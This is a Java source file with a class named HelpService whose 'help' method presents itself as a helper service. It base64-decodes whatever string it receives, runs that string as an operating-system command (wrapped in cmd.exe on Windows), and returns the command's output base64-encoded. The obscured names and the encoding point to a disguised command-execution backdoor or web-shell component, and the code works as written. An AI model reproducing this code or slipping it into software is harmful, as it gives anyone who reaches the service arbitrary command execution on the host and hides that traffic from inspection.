package helper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import sun.misc.BASE64Encoder;
import sun.misc.BASE64Decoder;

public class HelpService {
	public String help(String element) {
		if(element == null)
			return null;
	
		BufferedReader b = null;
		BufferedReader b1 = null;
		StringBuilder xx = new StringBuilder();

		if(System.getProperty("os.name").contains("Windows")){
			element = String.format("cmd.exe /C %s", zzd(element,1));
		} else {
			element = zzd(element,1);
		}

		try{
			Process p = Runtime.getRuntime().exec(element);
			p.waitFor();
			b = new BufferedReader(new InputStreamReader(p.getInputStream()));
			b1 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
			String l = "";
			while((l = b.readLine()) != null)
				xx.append("\n" + l);
			
			while((l = b1.readLine()) != null)
				xx.append("\n" + l);

		}
		catch(Exception e){
			xx.append(e.toString());
		}
		finally {
			try{
				b.close();
				b1.close();
			}catch(Exception e){
				xx.append(e.toString());
			}
		}

		return zzd(xx.toString(), 2);
	}

	private static String zzd(String msg, int op){
		String emsg = null;
		try {
			switch(op){
				case 1:
					BASE64Decoder d = new BASE64Decoder();
					emsg = new String(d.decodeBuffer(msg));
					break;
				case 2:
					BASE64Encoder e = new BASE64Encoder();
					emsg = e.encode(msg.getBytes("UTF-8"));
					break;
			}
		}
		catch(Exception e){
			emsg = null;
		}

		return emsg;
	}
}
